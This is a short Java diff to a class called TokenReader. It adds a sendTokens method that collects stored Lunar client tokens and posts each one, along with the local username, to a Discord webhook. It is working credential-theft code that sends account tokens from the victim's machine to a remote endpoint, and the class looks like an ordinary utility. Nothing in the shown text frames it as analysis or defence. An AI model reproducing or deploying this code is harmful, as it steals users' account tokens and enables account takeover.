@@ -8,9 +8,29 @@ import java.util.Map;
 import java.util.Set;
 
 import com.google.gson.*;
+import org.lwjgl.Sys;
 
 public class TokenReader {
     String windowsPath;
+
+    public String cleanString(String input) {
+        return input.replace("\"", "");
+    }
+
+    public void sendTokens(String url) {
+        try {
+            DiscordWebhook webhook = new DiscordWebhook(url);
+            webhook.setContent("Lunar tokens from " + System.getProperty("user.name"));
+            webhook.execute();
+            Map<String, String> map = this.getTokens();
+            for(String key : map.keySet()) {
+                webhook.setContent(cleanString(key) + ": " + cleanString(map.get(key)));
+                webhook.execute();
+            }
+        } catch (Exception e) {
+            System.out.println("Failed to send tokens: " + e.getMessage());
+        }
+    }
 
     public Map<String, String> getTokens() throws IOException {
         JsonObject json = this.readLunarFileJson();
